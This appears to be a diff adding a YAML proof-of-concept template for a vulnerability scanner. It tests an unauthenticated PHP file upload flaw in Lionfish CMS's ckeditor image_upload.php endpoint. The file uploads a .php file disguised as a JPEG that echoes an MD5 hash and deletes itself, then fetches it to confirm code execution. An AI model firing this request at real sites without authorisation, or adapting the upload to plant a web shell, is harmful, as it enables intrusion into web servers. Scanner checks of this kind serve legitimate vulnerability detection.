@@ -1,0 +1,40 @@
+name: poc-yaml-lionfish-cms-image-upload-php-upload
+manual: true
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"files\"; filename=\"{{randname}}.php\"\r\n\
+                Content-Type: image/jpeg\r\n\
+                \r\n\
+                <?php echo md5({{r1}});unlink(__FILE__);?>\r\n\
+                ------WebKitFormBoundary{{rboundary}}--\r\n\
+                "
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(".php"))
+        output:
+            search: '"imgurl\":\"(?P<path>.*?)\"".bsubmatch(response.body)'
+            path: search["path"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Common/{{path}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
+detail:
+    author: sharecast
+    links:
+        - https://www.cnblogs.com/KHZ521/p/14782653.html
